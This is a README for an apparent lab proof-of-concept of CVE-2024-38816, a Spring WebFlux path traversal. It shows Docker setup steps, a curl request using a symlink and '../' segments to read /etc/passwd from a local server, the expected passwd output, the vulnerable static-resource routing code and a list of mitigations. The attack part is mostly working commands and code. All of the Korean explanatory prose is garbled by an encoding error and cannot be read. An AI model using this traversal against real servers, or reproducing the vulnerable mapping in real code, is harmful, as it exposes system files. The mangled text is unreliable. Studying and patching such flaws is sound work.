# CVE-2024-38816 - Spring WebFlux Path Traversal PoC

> Spring WebFlux ì •ì  ìì› ë¼ìš°íŒ… ì·¨ì•½ì ì„ ì•…ìš©í•œ ë””ë ‰í† ë¦¬ ê²½ë¡œ ìš°íšŒ (Path Traversal) ì‹¤ìŠµ í”„ë¡œì íŠ¸

---

## ğŸ“Œ ê°œìš”

ì´ í”„ë¡œì íŠ¸ëŠ” [CVE-2024-38816](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-38816) ì·¨ì•½ì ì„ ì‹¤ìŠµí•˜ê³  ê²€ì¦í•˜ê¸° ìœ„í•œ PoCì…ë‹ˆë‹¤.

Spring WebFlux í™˜ê²½ì—ì„œ `RouterFunctions.resources()` ë©”ì„œë“œë¥¼ ì‚¬ìš©í•  ë•Œ, ê²½ë¡œ ì •ê·œí™” ì—†ì´ ì‚¬ìš©ì ì…ë ¥ì„ ê·¸ëŒ€ë¡œ íŒŒì¼ ì‹œìŠ¤í…œì— ë§¤í•‘í•  ê²½ìš° **ë””ë ‰í† ë¦¬ ê²½ë¡œ ìš°íšŒ(Path Traversal)**ê°€ ë°œìƒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

---

## âš™ï¸ í™˜ê²½ ì •ë³´

- **Framework**: Spring Boot 3.0.13 (WebFlux)
- **Java**: OpenJDK 17
- **Build Tool**: Gradle 7.6.1
- **Platform**: Docker ê¸°ë°˜ ë©€í‹°ìŠ¤í…Œì´ì§€ ë¹Œë“œ ì‚¬ìš©
- **PoC ê¸°ë°˜**: `FileSystemResource`ì™€ `/static/**` ë§¤í•‘

---

## ğŸ› ï¸ ì‹¤í–‰ ë°©ë²•

### 1. í”„ë¡œì íŠ¸ í´ë¡  ë° ì´ë™

```bash
git clone https://github.com/your-id/cve-2024-38816-poc.git
cd cve-2024-38816-poc
```

### 2. Docker ë¹Œë“œ ë° ì‹¤í–‰

```bash
docker build -t path-traversal-demo .
docker run --rm -p 8080:8080 path-traversal-demo
```

---

## ğŸ§ª ê³µê²© ì‹œë‚˜ë¦¬ì˜¤

ì‹¤í–‰ ì¤‘ì¸ ì• í”Œë¦¬ì¼€ì´ì…˜ì— ë‹¤ìŒ ìš”ì²­ì„ ë³´ë‚´ `/etc/passwd` íŒŒì¼ì„ ë…¸ì¶œì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```bash
curl http://localhost:8080/static/link/../link/../etc/passwd
```

### ê¸°ëŒ€ ê²°ê³¼ (Linux í™˜ê²½ì¼ ê²½ìš°):

```
root:x:0:0:root:/root:/bin/bash
...
```

---

## ğŸ“‚ í”„ë¡œì íŠ¸ êµ¬ì¡°

```plaintext
.
â”œâ”€â”€ Dockerfile
â”œâ”€â”€ build.gradle
â”œâ”€â”€ LICENSE
â”œâ”€â”€ README.md
â””â”€â”€ src/
    â””â”€â”€ main/java/com/example/PathTraversalDemoApplication.java
```

---

## ğŸ” ì·¨ì•½ ì½”ë“œ ì„¤ëª…

```java
@Bean
public RouterFunction<ServerResponse> staticRouter() {
    return RouterFunctions.resources("/static/**", new FileSystemResource("/app/static/"));
}
```

- `/static/**` ê²½ë¡œëŠ” `/app/static/` íŒŒì¼ ì‹œìŠ¤í…œ ë£¨íŠ¸ë¥¼ ê·¸ëŒ€ë¡œ ì°¸ì¡°í•©ë‹ˆë‹¤.
- ì‹¬ë³¼ë¦­ ë§í¬(`/static/link â†’ /static`)ì™€ ìƒëŒ€ê²½ë¡œ(`../`)ë¥¼ ì¡°í•©í•˜ë©´ ë””ë ‰í† ë¦¬ íƒˆì¶œ ê°€ëŠ¥

---

## âœ… ëŒ€ì‘ ë°©ì•ˆ

- ìƒëŒ€ ê²½ë¡œ í•„í„°ë§ (`../` í¬í•¨ ì—¬ë¶€ ì²´í¬)
- ì •ê·œí™”(normalization)ëœ ê²½ë¡œë§Œ í—ˆìš©
- classpath ë‚´ ë¦¬ì†ŒìŠ¤ë§Œ ì„œë¹™í•˜ë„ë¡ ì œí•œ
- ì‹¬ë³¼ë¦­ ë§í¬ ì œê±° ë˜ëŠ” ë¶„ë¦¬ëœ ë³¼ë¥¨ ì²˜ë¦¬
- Spring Security ë“±ì„ í™œìš©í•œ ê²½ë¡œ ë³´í˜¸

---

## ğŸ“š ì°¸ê³ ìë£Œ

- [Spring ê³µì‹ ë¬¸ì„œ - WebFlux Static Resources](https://docs.spring.io/spring-framework/docs/current/reference/html/web-reactive.html#webflux-static-resources)
- [CVE ê³µì‹ ë“±ë¡: CVE-2024-38816](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-38816)
- [PoC ì›ë³¸ GitHub](https://github.com/masa42/CVE-2024-38816-PoC)

---

## ğŸ“ ë¼ì´ì„ ìŠ¤

ë³¸ í”„ë¡œì íŠ¸ëŠ” MIT ë¼ì´ì„ ìŠ¤ë¥¼ ë”°ë¦…ë‹ˆë‹¤.
